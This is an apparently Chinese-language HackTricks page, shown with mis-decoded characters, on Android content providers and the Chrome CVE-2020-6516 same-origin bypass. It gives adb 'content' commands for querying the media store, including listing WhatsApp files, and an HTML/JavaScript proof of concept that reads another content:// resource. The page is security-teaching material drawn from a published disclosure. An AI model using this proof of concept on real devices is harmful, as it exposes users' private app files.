<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


è¦å°è¯•ä½¿ç”¨å†…å®¹æä¾›è€…ï¼Œå¯ä»¥åœ¨Androidè®¾å¤‡ä¸Šä½¿ç”¨`content`å‘½ä»¤ã€‚ä¸ä¸€å®šéœ€è¦rootè®¿é—®æƒé™ã€‚ä¾‹å¦‚ï¼Œè¦æŸ¥çœ‹ç”±åª’ä½“å­˜å‚¨ç®¡ç†çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```bash
$ content query --uri content://media/external/file
```
ä¸ºäº†ä½¿è¾“å‡ºæ›´åŠ ç”¨æˆ·å‹å¥½ï¼Œå¯ä»¥å°†æ˜¾ç¤ºçš„åˆ—é™åˆ¶ä¸ºæ¯ä¸ªç´¢å¼•æ–‡ä»¶çš„æ ‡è¯†ç¬¦å’Œè·¯å¾„ã€‚
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
åª’ä½“æä¾›è€…å­˜åœ¨äºå®ƒä»¬è‡ªå·±çš„ç§æœ‰å‘½åç©ºé—´ä¸­ã€‚å¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œè¦è®¿é—®å†…å®¹æä¾›è€…ï¼Œåº”æŒ‡å®šç›¸åº”çš„ `content://` URIã€‚é€šå¸¸ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹åº”ç”¨ç¨‹åºæ¸…å•ï¼ˆå¦‚æœå†…å®¹æä¾›è€…ç”±åº”ç”¨ç¨‹åºå¯¼å‡ºï¼‰æˆ–Androidæ¡†æ¶çš„æºä»£ç æ¥æ¢å¤å¯ä»¥è®¿é—®æä¾›è€…çš„è·¯å¾„ä¿¡æ¯ã€‚

æœ‰è¶£çš„æ˜¯ï¼Œåœ¨Androidè®¾å¤‡ä¸Šï¼ŒChromeæ”¯æŒé€šè¿‡ `content://` æ–¹æ¡ˆè®¿é—®å†…å®¹æä¾›è€…ã€‚è¿™ä¸ªåŠŸèƒ½å…è®¸æµè§ˆå™¨è®¿é—®ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå¯¼å‡ºçš„èµ„æºï¼ˆä¾‹å¦‚ç…§ç‰‡ã€æ–‡æ¡£ç­‰ï¼‰ã€‚ä¸ºäº†éªŒè¯è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨åª’ä½“å­˜å‚¨ä¸­æ’å…¥ä¸€ä¸ªè‡ªå®šä¹‰æ¡ç›®ï¼Œç„¶åä½¿ç”¨æµè§ˆå™¨è®¿é—®å®ƒï¼š
```bash
$ cd /sdcard
$ echo "Hello, world!" > test.txt
$ content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
è¦å‘ç°æ–°æ’å…¥æ–‡ä»¶çš„æ ‡è¯†ç¬¦ï¼š
```bash
$ content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
è€Œè¦åœ¨Chromeä¸­æŸ¥çœ‹æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å›¾ç‰‡ä¸­æ˜¾ç¤ºçš„URLã€‚è¯·æ³¨æ„ï¼Œæ–‡ä»¶æ ‡è¯†ç¬¦747ï¼ˆä¸Šé¢å‘ç°çš„ï¼‰è¢«ç”¨ä½œURLçš„åç¼€ã€‚

![Chrome "Hello, world!"](https://census-labs.com/media/whatsapp-screenshot-hello-world.png)

ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥åˆ—å‡ºä¸WhatsAppç›¸å…³çš„æ‰€æœ‰æ–‡ä»¶ï¼š
```bash
$ content query --uri content://media/external/file --projection _id,_data | grep -i whatsapp
...

Row: 82 _id=58, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache
Row: 83 _id=705, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/157.240.9.53.443
Row: 84 _id=239, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443
Row: 85 _id=240, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/pps.whatsapp.net.443
Row: 86 _id=90, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/static.whatsapp.net.443
Row: 87 _id=706, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/v.whatsapp.net.443
Row: 88 _id=89, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/www.whatsapp.com.443
...
```
## Chrome CVE-2020-6516 Same-Origin-Policyç»•è¿‡ <a href="#cve-2020-6516" id="cve-2020-6516"></a>

æµè§ˆå™¨ä¸­çš„_åŒæºç­–ç•¥_ï¼ˆSOPï¼‰\[[12](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)] è§„å®šï¼ŒURL Açš„Javascriptå†…å®¹åªèƒ½åœ¨ä»¥ä¸‹URLå±æ€§ä¿æŒç›¸åŒçš„æƒ…å†µä¸‹è®¿é—®URL Bçš„å†…å®¹ï¼š

* åè®®ï¼Œä¾‹å¦‚ `https` vs. `http`
* åŸŸåï¼Œä¾‹å¦‚ `www.example1.com` vs. `www.example2.com`
* ç«¯å£ï¼Œä¾‹å¦‚ `www.example1.com:8080` vs. `www.example1.com:8443`

å½“ç„¶ï¼Œä¸Šè¿°è§„åˆ™ä¹Ÿæœ‰ä¾‹å¤–æƒ…å†µï¼Œä½†é€šå¸¸æƒ…å†µä¸‹ï¼Œæ¥è‡ª `https://www.example1.com` çš„èµ„æºï¼ˆä¾‹å¦‚ä¸€æ®µJavascriptä»£ç ï¼‰ä¸èƒ½è®¿é—® `https://www.example2.com` ä¸Šçš„DOMï¼Œå› ä¸ºè¿™ä¼šå¼•å…¥ä¸¥é‡çš„ä¿¡æ¯æ³„æ¼ã€‚**é™¤éCross-Origin-Resource-Sharingï¼ˆCORSï¼‰ç­–ç•¥æ˜ç¡®å…è®¸ï¼Œå¦åˆ™Webèµ„æºä¸åº”è¯¥ç»•è¿‡SOPè§„åˆ™ã€‚**

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒChromeå°† `content://` è§†ä¸º_æœ¬åœ°æ–¹æ¡ˆ_ï¼Œå°±åƒ `file://` ä¸€æ ·ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒSOPè§„åˆ™æ›´åŠ ä¸¥æ ¼ï¼Œå› ä¸ºæ¯ä¸ªæœ¬åœ°æ–¹æ¡ˆURLéƒ½è¢«è§†ä¸ºå•ç‹¬çš„æºã€‚ä¾‹å¦‚ï¼Œä½äº **file:///tmp/test.html** ä¸­çš„Javascriptä»£ç ä¸åº”è¯¥èƒ½å¤Ÿè®¿é—® **file:///tmp/test2.html** æˆ–è€…æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ä»»ä½•å…¶ä»–æ–‡ä»¶ã€‚**å› æ­¤ï¼Œæ ¹æ®SOPè§„åˆ™ï¼Œé€šè¿‡ `content://` åŠ è½½çš„èµ„æºä¸åº”è¯¥èƒ½å¤Ÿè®¿é—®ä»»ä½•å…¶ä»– `content://` èµ„æºã€‚**ç„¶è€Œï¼ŒChromeçš„æ¼æ´CVE-2020-6516ä¸ºæ­¤è§„åˆ™åˆ›å»ºäº†ä¸€ä¸ªâ€œä¾‹å¤–â€ã€‚

CVE-2020-6516 \[[03](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516)] æ˜¯é€šè¿‡ `content://` URLåŠ è½½çš„èµ„æºçš„SOPç»•è¿‡ã€‚**ä¾‹å¦‚ï¼Œä» `content://com.example.provider/test.html` åŠ è½½çš„HTMLæ–‡æ¡£ä¸­è¿è¡Œçš„Javascriptä»£ç å¯ä»¥åŠ è½½å’Œè®¿é—®é€šè¿‡ `content://` URLåŠ è½½çš„ä»»ä½•å…¶ä»–èµ„æºã€‚**è¿™æ˜¯ä¸€ä¸ªä¸¥é‡çš„æ¼æ´ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡ŒAndroid 9æˆ–ä¹‹å‰ç‰ˆæœ¬çš„è®¾å¤‡ä¸Šã€‚åœ¨è¿™äº›è®¾å¤‡ä¸Šï¼Œæœªå®ç°ä½œç”¨åŸŸå­˜å‚¨ \[[13](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage)]ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ç³»ç»Ÿçš„åª’ä½“å­˜å‚¨å†…å®¹æä¾›ç¨‹åºè®¿é—®ä½äº **/sdcard** ä¸‹çš„åº”ç”¨ç¨‹åºç‰¹å®šæ•°æ®ï¼Œæ›´æœ‰è¶£çš„æ˜¯å¯ä»¥è®¿é—®ä½äº **/sdcard/Android** ä¸‹çš„æ•°æ®ã€‚

ä¸€ä¸ªç®€å•çš„æ¦‚å¿µéªŒè¯ã€‚å°†ä½¿ç”¨ `XMLHttpRequest` è®¿é—®ä»»æ„ `content://` URL çš„HTMLæ–‡æ¡£ä¸Šä¼ åˆ° **/sdcard** ä¸‹ã€‚ç„¶åå°†å…¶æ·»åŠ åˆ°åª’ä½“å­˜å‚¨ä¸­ï¼Œå¹¶åœ¨Chromeä¸­å‘ˆç°ï¼Œç±»ä¼¼äºä¹‹å‰å±•ç¤ºçš„ç¤ºä¾‹ã€‚ä¸ºäº†æ¼”ç¤ºç›®çš„ï¼Œå¯ä»¥å°è¯•åŠ è½½ `content://media/external/file/747`ï¼Œå®é™…ä¸Šè¿™æ˜¯â€œHello, world!â€ç¤ºä¾‹çš„åª’ä½“å­˜å‚¨URLã€‚ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œè¿è¡Œåœ¨HTMLæ–‡æ¡£æºä¸­çš„Javascriptä»£ç å°†è·å–å¹¶æ˜¾ç¤º **test.txt** çš„å†…å®¹ã€‚
```markup
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
**ä»è¿™ç¯‡æ–‡ç« ä¸­è·å–çš„ä¿¡æ¯ï¼š** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
